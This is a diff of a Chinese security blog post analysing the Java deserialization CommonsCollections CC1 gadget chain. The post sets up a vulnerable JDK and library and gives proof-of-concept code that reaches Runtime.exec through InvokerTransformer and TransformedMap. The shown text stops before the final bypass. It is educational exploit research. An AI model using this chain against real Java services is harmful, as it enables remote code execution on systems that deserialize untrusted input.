@@ -60,7 +60,6 @@
 <meta property="og:image" content="https://mirror4s.github.io/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230115165023655.png">
 <meta property="og:image" content="https://mirror4s.github.io/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230203202927132.png">
 <meta property="og:image" content="https://mirror4s.github.io/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230116101359073.png">
-<meta property="og:image" content="https://mirror4s.github.io/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230115192408857.png">
 <meta property="og:image" content="https://mirror4s.github.io/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230116101531106.png">
 <meta property="og:image" content="https://mirror4s.github.io/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230116102151138.png">
 <meta property="og:image" content="https://mirror4s.github.io/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230116101647272.png">
@@ -77,7 +76,7 @@
 <meta property="og:image" content="https://mirror4s.github.io/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230116113107441.png">
 <meta property="og:image" content="https://mirror4s.github.io/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230116115829515.png">
 <meta property="article:published_time" content="2023-01-12T11:48:51.000Z">
-<meta property="article:modified_time" content="2023-02-03T12:33:57.493Z">
+<meta property="article:modified_time" content="2023-02-03T13:04:49.832Z">
 <meta property="article:author" content="MirRoR4s">
 <meta property="article:tag" content="JAVA反序列化">
 <meta name="twitter:card" content="summary_large_image">
@@ -289,7 +288,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          6.9k 字
+          14k 字
         
       </span>
     
@@ -300,7 +299,7 @@
         
         
         
-          58 分钟
+          121 分钟
         
       </span>
     
@@ -352,8 +351,10 @@
               <div class="markdown-body">
                 
                 <!--toc-->
+
 <p>这一篇分析 Java 反序列化 CommonsCollections 的 CC1 链。</p>
 <span id="more"></span>
+
 <h3 id="一-前言"><a href="#一-前言" class="headerlink" title="一. 前言"></a>一. 前言</h3><p>Common-Collections 相关介绍</p>
 <p>直接看<a target="_blank" rel="noopener" href="https://blinkfox.github.io/2018/09/13/hou-duan/java/commons/commons-collections-bao-he-jian-jie/">闪烁之狐</a>大佬的即可。</p>
 <p>也可以看看这篇 <a target="_blank" rel="noopener" href="https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/">foxlovesecurity</a></p>
@@ -371,48 +372,50 @@
 </blockquote>
 <p>我新建了一个名为 <strong>jdk8u65</strong> 的文件作为我的安装目录</p>
 <h4 id="21-pomxml-添加依赖"><a href="#2-1-pom-xml-添加依赖" class="headerlink" title="2.1 pom.xml 添加依赖"></a>2.1 pom.xml 添加依赖</h4><p>再接着，创建一个 IDEA 项目，选中 maven，并使用 jdk8u65。创建完毕之后在 pom.xml 中添加如下依赖</p>
-<p><img src="/images/JAVA反序列化04/image-20230113103415079.png" srcset="/img/loading.gif" lazyload alt="image-20230113103415079"></p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230113103415079.png" srcset="/img/loading.gif" lazyload alt="image-20230113103415079"></p>
 <p>添加依赖之后右上角如果出现 pom 的图标，点击一下就好了。</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.example<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>CC1<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.source</span>&gt;</span>8<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.source</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.target</span>&gt;</span>8<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.target</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="hljs-tag">&lt;/<span class="hljs-name">project.build.sourceEncoding</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
 <p>如何验证环境导入成功？我们 import CC 的包</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br></code></pre></td></tr></table></figure>
+
 <p>如果成功说明安装成功了。之后点进去 <code>InvokerTransformer</code> 包，然后如果右上角出现了 pom 的下载源，那就下载。</p>
-<p><img src="/images/JAVA反序列化04/image-20230203180113819.png" srcset="/img/loading.gif" lazyload alt="image-20230203180113819"></p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230203180113819.png" srcset="/img/loading.gif" lazyload alt="image-20230203180113819"></p>
 <h4 id="22-修改-sun-包"><a href="#2-2-修改-sun-包" class="headerlink" title="2.2 修改 sun 包"></a>2.2 修改 sun 包</h4><p>首先在我们的 jdk8u65 文件夹有一个 src.zip</p>
-<p><img src="/images/JAVA反序列化04/image-20230113103810638.png" srcset="/img/loading.gif" lazyload alt="image-20230113103810638"></p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230113103810638.png" srcset="/img/loading.gif" lazyload alt="image-20230113103810638"></p>
 <p>我们在这个目录新建一个文件夹 src，并将 src.zip 的内容解压到 src，之后去下面的链接下载 sun 包。</p>
 <p><a target="_blank" rel="noopener" href="http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/af660750b2f4">openJDK 8u65</a>————去到这个下载链接并点击 zip 下载</p>
-<p><img src="/images/JAVA反序列化04/image-20230113103610790.png" srcset="/img/loading.gif" lazyload alt="image-20230113103610790"></p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230113103610790.png" srcset="/img/loading.gif" lazyload alt="image-20230113103610790"></p>
 <p>下载完毕之后解压，进入 <code>jdk-af660750b2f4/src/share/classes</code> 目录下，将 sun 文件夹复制到前面建立的 src 文件夹中</p>
-<p><img src="/images/JAVA反序列化04/image-20230113103700410.png" srcset="/img/loading.gif" lazyload alt="image-20230113103700410"></p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230113103700410.png" srcset="/img/loading.gif" lazyload alt="image-20230113103700410"></p>
 <p>之后进入 idea，打开项目结构，将我们的 sun 目录添加到源路径</p>
-<p><img src="/images/JAVA反序列化04/image-20230113104721285.png" srcset="/img/loading.gif" lazyload alt="image-20230113104721285"></p>
-<p><img src="/images/JAVA反序列化04/image-20230113104700713.png" srcset="/img/loading.gif" lazyload alt="image-20230113104700713"></p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230113104721285.png" srcset="/img/loading.gif" lazyload alt="image-20230113104721285"></p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230113104700713.png" srcset="/img/loading.gif" lazyload alt="image-20230113104700713"></p>
 <h3 id="三-transformmap-版-cc1-攻击链分析"><a href="#三-TransformMap-版-CC1-攻击链分析" class="headerlink" title="三. TransformMap 版 CC1 攻击链分析"></a>三. TransformMap 版 CC1 攻击链分析</h3><h4 id="31-反序列化攻击思路"><a href="#3-1-反序列化攻击思路" class="headerlink" title="3.1 反序列化攻击思路"></a>3.1 反序列化攻击思路</h4><p>首先我们再次明确一下反序列化的攻击思路</p>
 <ul>
 <li>入口类需要一个 <code>readObject</code> 方法</li>
 <li>结尾需要一个能够命令执行的方法</li>
 <li>从入口类出发通过链子引导到结尾命令执行，故我们的攻击应从尾部出发去寻找头部。</li>
 </ul>
-<p><img src="/images/JAVA反序列化04/AttackRoad.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/AttackRoad.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <h5 id="311-寻找尾部的-exec-方法"><a href="#3-1-1-寻找尾部的-exec-方法" class="headerlink" title="3.1.1 寻找尾部的 exec 方法"></a>3.1.1 寻找尾部的 exec 方法</h5><p>接下来就正式开始复现 CC1 的链。</p>
 <p>首先在 idea 左侧项目找到 commons-collections-3.2.1，然后在集合模块找到 <code>Transformer.java</code> 文件。</p>
-<p><img src="/images/JAVA反序列化04/image-20230114163028342.png" srcset="/img/loading.gif" lazyload alt="image-20230114163028342"></p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230114163028342.png" srcset="/img/loading.gif" lazyload alt="image-20230114163028342"></p>
 <p>具体是在 org.apache.commons.collections 包下(位置靠下，所以往下拉一拉才能看到)</p>
-<p><img src="/images/JAVA反序列化04/image-20230114163041395.png" srcset="/img/loading.gif" lazyload alt="image-20230114163041395"></p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230114163041395.png" srcset="/img/loading.gif" lazyload alt="image-20230114163041395"></p>
 <blockquote>
 <p>网上没有人说为什么直接去 Transformer.java ，我也没懂，暂时搁置。这或许就是挖掘 Java 漏洞所要做的事情吧，找到攻击链！</p>
 </blockquote>
-<p><img src="/images/JAVA反序列化04/image-20230203180338437.png" srcset="/img/loading.gif" lazyload alt="image-20230203180338437"></p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230203180338437.png" srcset="/img/loading.gif" lazyload alt="image-20230203180338437"></p>
 <p>这是一个接口，我们使用 <code>ctrl + alt + B</code> 查看实现了这个接口的类。</p>
-<p><img src="/images/JAVA反序列化04/image-20230114163858589.png" srcset="/img/loading.gif" lazyload alt="image-20230114163858589"></p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230114163858589.png" srcset="/img/loading.gif" lazyload alt="image-20230114163858589"></p>
 <p>我看的视频和文章都是人工翻找以上的类看看有没有能执行 exec 方法的，我就省略这一步了，直接定位到 <code>InvokerTransformer</code> </p>
 <ul>
 <li><code>InvokerTransformer</code> 类的 <code>transform</code> 方法 存在一个反射调用任意类，所以这可以作为我们链子的终点。</li>
 </ul>
-<p><img src="/images/JAVA反序列化04/image-20230203181559198.png" srcset="/img/loading.gif" lazyload alt="image-20230203181559198"></p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230203181559198.png" srcset="/img/loading.gif" lazyload alt="image-20230203181559198"></p>
 <p>既然这里有漏洞，我们不妨先利用反射弹一个计算器玩玩。<code>InvokerTransformer</code> 类的构造函数如下</p>
-<p><img src="/images/JAVA反序列化04/image-20230203181646361.png" srcset="/img/loading.gif" lazyload alt="image-20230203181646361"></p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230203181646361.png" srcset="/img/loading.gif" lazyload alt="image-20230203181646361"></p>
 <p>注意到构造函数是公有的，所以我们可以直接 new 出来。</p>
 <ul>
 <li>第一个参数明显是字符串类型的方法名</li>
@@ -421,32 +424,35 @@
 </ul>
 <p>实例化一个 <strong>InvokerTransformer</strong> 对象，我们要执行命令，所以调用的方法当然是 <strong>exec</strong></p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br></code></pre></td></tr></table></figure>
+
 <p>用 Runtime 类的实例对象作为参数调用上述对象的 transfrom 方法</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>invokerTransformer.transform(runtime);<br></code></pre></td></tr></table></figure>
+
 <p>运行之后就可以弹出计算器，具体为什么可以弹计算器就不写了，可以自行分析一下。</p>
 <p>注意到我们最后一句代码是 <code>invokerTransformer.transform(runtime)</code> ，所以我们下一步的目标就是去找调用 <code>InvokerTransformer.transform</code> 方法的不同名函数</p>
 <h5 id="312-初步寻找链子-checksetvalue"><a href="#3-1-2-初步寻找链子-checksetValue" class="headerlink" title="3.1.2 初步寻找链子 checksetValue"></a>3.1.2 初步寻找链子 checksetValue</h5><p>如上所述，现在回到 <code>InvokerTransformer.transform</code> 方法并寻找调用了这个方法的不同名的函数。IDEA 可以帮我们快速做到这一点，只需要将光标停留在这个方法上并右键点击 find usages 即可。如果 find usages 有问题的话，可以先 <code>Ctrl+Alt+Shift+F7</code>，选择 <code>All place</code> 查询。最后的结果应如下图</p>
-<p><img src="/images/JAVA反序列化04/image-20230114165818223.png" srcset="/img/loading.gif" lazyload alt="image-20230114165818223"></p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230114165818223.png" srcset="/img/loading.gif" lazyload alt="image-20230114165818223"></p>
 <blockquote>
 <p>这里同样有一个逐个翻看调用了 transform 方法的那些类的操作，目的是为了找到可行的链子。我节省时间故直接给出答案。</p>
 </blockquote>
 <p> <code>TransformedMap</code> 类调用了 <code>transform</code> 方法</p>
-<p><img src="/images/JAVA反序列化04/image-20230203182905938.png" srcset="/img/loading.gif" lazyload alt="image-20230203182905938"></p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230203182905938.png" srcset="/img/loading.gif" lazyload alt="image-20230203182905938"></p>
 <p>具体地说是这个类中的 <code>checkSetValue()</code> 方法调用了 <code>transform()</code> 方法。我们右键选中然后 jump to source</p>
-<p><img src="/images/JAVA反序列化04/image-20230203182949891.png" srcset="/img/loading.gif" lazyload alt="image-20230203182949891"></p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230203182949891.png" srcset="/img/loading.gif" lazyload alt="image-20230203182949891"></p>
 <ul>
 <li>OK，接下来我们去看一看 <code>TransformedMap.checkSetValue()</code> 中的 <code>valueTransformer</code> 是什么东西，最终在 <code>TransformedMap</code> 的成员变量中发现了 <code>valueTransformer</code></li>
 </ul>
-<p><img src="/images/JAVA反序列化04/image-20230203183117534.png" srcset="/img/loading.gif" lazyload alt="image-20230203183117534"></p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230203183117534.png" srcset="/img/loading.gif" lazyload alt="image-20230203183117534"></p>
 <p>并且在构造函数中可以设置这个变量的值，如下图：</p>
-<p><img src="/images/JAVA反序列化04/image-20230203183232326.png" srcset="/img/loading.gif" lazyload alt="image-20230203183232326"></p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230203183232326.png" srcset="/img/loading.gif" lazyload alt="image-20230203183232326"></p>
 <ul>
 <li>因为 <code>TransformedMap</code> 的构造方法作用域是 <code>protected</code>，所以我们还需要去找一找谁调用了 <code>TransformedMap</code> 的构造方法。</li>
 </ul>
 <p>发现在 <code>TransformedMap.decorate()</code> 静态方法中创建了 <code>TransformedMap</code> 对象</p>
-<p><img src="/images/JAVA反序列化04/image-20230203183359420.png" srcset="/img/loading.gif" lazyload alt="image-20230203183359420"></p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230203183359420.png" srcset="/img/loading.gif" lazyload alt="image-20230203183359420"></p>
 <p>到这一步，尝试将其作为链子的开头，编写 POC</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// 实例化一个 InvokerTransformer 对象</span><br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br><span class="hljs-comment">//</span><br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br><br>        HashMap&lt;String,String&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <br>        <span class="hljs-comment">// decorate 方法的返回类型是 Map</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">transformedMap</span> <span class="hljs-operator">=</span>  TransformedMap.decorate(hashMap,<span class="hljs-literal">null</span>,invokerTransformer);<br><br>        <span class="hljs-comment">// checkSetValue 方法是 protected，所以接下来要通过反射调用这个方法</span><br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> TransformedMap.class;<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> c.getDeclaredMethod(<span class="hljs-string">&quot;checkSetValue&quot;</span>,Object.class);<br>        method.setAccessible(<span class="hljs-literal">true</span>);<br>        method.invoke(transformedMap,runtime);<br><br><br>    &#125;<br></code></pre></td></tr></table></figure>
+
 <p>再顺带讲一讲这个链子是怎么构造出来的吧，这里讲一遍，之后的就不讲了。</p>
 <ul>
 <li>先明确一下思路，尾部链子，也就是我们要利用的漏洞，是因为 <code>invokeTransformer</code> 的 <code>transform</code> 方法可以进行反射的命令执行。</li>
@@ -457,17 +463,18 @@
 <li>目前找到的链子位于 <code>TransformedMap.checkSetValue</code> 当中，去找 <code>.decorate</code> 的链子，发现无法进一步前进了，所以我们回到 <code>checkSetValue</code> 重新找链子。</li>
 </ul>
 <p>继续 <code>find usages</code>，发现 AbstractInputCheckedMapDecorator$<strong>MapEntry</strong>.setValue() 方法中的 <code>parent.checkSetValue(value);</code> 语句调用了 <code>checkSetValue()</code></p>
-<p><img src="/images/JAVA反序列化04/image-20230203185237325.png" srcset="/img/loading.gif" lazyload alt="image-20230203185237325"></p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230203185237325.png" srcset="/img/loading.gif" lazyload alt="image-20230203185237325"></p>
 <p>我们跟进去发现 <code>AbstractInputCheckedMapDecorator</code> 是一个抽象类，并且是 <code>TransformedMap</code> 的父类。</p>
-<p><img src="/images/JAVA反序列化04/image-20230114175224373.png" srcset="/img/loading.gif" lazyload alt="image-20230114175224373"></p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230114175224373.png" srcset="/img/loading.gif" lazyload alt="image-20230114175224373"></p>
 <p>并且发现是这个类的一个内部类 <code>MapEntry.setValue()</code> 调用了 <code>checkSetValue()</code>  </p>
-<p><img src="/images/JAVA反序列化04/image-20230203185908273.png" srcset="/img/loading.gif" lazyload alt="image-20230203185908273"></p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230203185908273.png" srcset="/img/loading.gif" lazyload alt="image-20230203185908273"></p>
 <p>接下来我们继续前面的操作，构造链子弄出一个调用上图 setValue 的对象来。当前的 setValue 方法 隶属于 AbstractInputCheckedMapDecorator 类中的 <strong>MapEntry</strong> 类，所以我们肯定是要弄一个 MapEntry 类对象出来，那如何实现这一点呢？</p>
 <p>只需要调用 AbstractInputCheckedMapDecorator（实际是 TransformedMap 类） 类的 entrySet 得到一个 EntrySet 实例对象并进行遍历（这样才会调用到 EntrySet 的 iterator 方法，具体为什么可以打断点分析，不展开说了否则没完没了），遍历的时候可以获得一个 MapEntry 类对象，我们调用其 setValue 方法就可以完成链子的构造。</p>
 <p>我们可以写一段代码来调试一下，看一看在遍历 Map 的时候，会不会走到 <code>setValue</code> 中。在 <code>setValue</code> 的 192 行打个断点，并修改一下我们的 Poc</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span><br>                , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(<span class="hljs-string">&quot;key&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);<br>        Map&lt;Object, Object&gt; decorateMap = TransformedMap.decorate(hashMap, <span class="hljs-literal">null</span>, invokerTransformer);<br>        <span class="hljs-comment">// decorateMap 是一个 TransformedMap 类对象 （class org.apache.commons.collections.map.TransformedMap）</span><br>        <span class="hljs-keyword">for</span> (Map.Entry entry:decorateMap.entrySet())&#123;<br>            entry.setValue(runtime);<br><br>        &#125;<br><br>    &#125;<br></code></pre></td></tr></table></figure>
+
 <p>发现确实跟进来了：</p>
-<p><img src="/images/JAVA反序列化04/image-20230114203811881.png" srcset="/img/loading.gif" lazyload alt="image-20230114203811881"></p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230114203811881.png" srcset="/img/loading.gif" lazyload alt="image-20230114203811881"></p>
 <blockquote>
 <p>更具体的可以打断点慢慢分析，这里涉及到外部类调用内部类、内部类又去调用自己的子类等，过程特别冗长，不分析下去了。</p>
 </blockquote>
@@ -477,111 +484,117 @@
 <li>之前链子是到 <code>AbstractInputCheckedMapDecorator$MapEntry.setValue()</code> 的，所以我们在 <code>setValue()</code> 处，find usages</li>
 </ul>
 <p>不多说，下图直接给出我们 readObject 的入口类：</p>
-<p><img src="/images/JAVA反序列化04/image-20230203195217286.png" srcset="/img/loading.gif" lazyload alt="image-20230203195217286"></p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230203195217286.png" srcset="/img/loading.gif" lazyload alt="image-20230203195217286"></p>
 <p>我们的链首位于 <strong>AnnotationInvocationHandler.readObejct()</strong></p>
 <blockquote>
 <p>这个 readObject 是在进行 Map 遍历的时候调用的 setValue 方法，该说不说这简直完美契合我们之前的链子，难怪被大佬们拿来作为入口类！</p>
 </blockquote>
-<p><img src="/images/JAVA反序列化04/image-20230203195508050.png" srcset="/img/loading.gif" lazyload alt="image-20230203195508050"></p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230203195508050.png" srcset="/img/loading.gif" lazyload alt="image-20230203195508050"></p>
 <p>上图 444 行的 <code>memberValues.entrySet()</code>和 451行的 <code>memberValue.setValue()</code> 就是我们链子的触发点。</p>
 <p>我们可以在 <strong>AnnotationInvocationHandler</strong> 类的构造函数中设置 memberValues  的值，若我们让 memberValues 是一个 TransformedMap 类对象，那么 memberValues.entrySet() 就会得到一个 AbstractInputCheckedMapDecorator$<strong>MapEntry</strong>，若能调用到这个对象的 setValue 方法，我们就可以完成整个整个漏洞的利用链了。</p>
-<p><img src="/images/JAVA反序列化04/image-20230203195900745.png" srcset="/img/loading.gif" lazyload alt="image-20230203195900745"></p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230203195900745.png" srcset="/img/loading.gif" lazyload alt="image-20230203195900745"></p>
 <p>从上图可以看到 AnnotationInvocationHandler 的作用域为 <code>default</code>，所以我们需要通过反射的方式来获取这个类及其构造函数。</p>
 <p>现在我们就是想调用 AbstractInputCheckedMapDecorator$<strong>MapEntry</strong> 类对象的 setValue 方法，在 451 行我们可以做到这一点。然而，阅读一下代码就会发现有两个 if 判断会阻拦我们进入 setValue 方法</p>
-<p><img src="/images/JAVA反序列化04/image-20230203200242163.png" srcset="/img/loading.gif" lazyload alt="image-20230203200242163"></p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/image-20230203200242163.png" srcset="/img/loading.gif" lazyload alt="image-20230203200242163"></p>
 <p>接下来说说如何绕过这两个 if！</p>
